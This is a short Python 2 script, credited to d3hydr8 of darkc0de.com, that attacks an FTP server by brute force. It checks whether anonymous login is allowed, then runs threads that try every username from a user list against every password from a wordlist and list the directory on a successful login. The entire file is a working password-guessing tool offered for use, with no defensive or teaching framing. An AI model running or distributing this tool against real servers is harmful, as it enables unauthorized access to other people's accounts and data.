#!usr/bin/python
#Ftp Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, ftplib
from ftplib import FTP
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./ftpbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com ftpBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"

try:
	f = FTP(sys.argv[1])
	print "[+] Response:",f.getwelcome()
except (ftplib.all_errors):
	pass

try:
	print "\n[+] Checking for anonymous login\n"
	ftp = FTP(sys.argv[1])
	ftp.login()
	ftp.retrlines('LIST')
	print "\t\nAnonymous login successful!!!\n"
	ftp.quit()
except (ftplib.all_errors): 
	print "\tAnonymous login unsuccessful\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return value[0][:-1], users[0]
	else:
		return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			print "-"*12
			print "User:",user,"Password:",value
			ftp = FTP(sys.argv[1])
			ftp.login(user, value)
			ftp.retrlines('LIST')
			print "\t\nLogin successful:",value, user
			ftp.quit()
			work.join()
			sys.exit(2)
		except (ftplib.all_errors), msg: 
			#print "An error occurred:", msg
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)
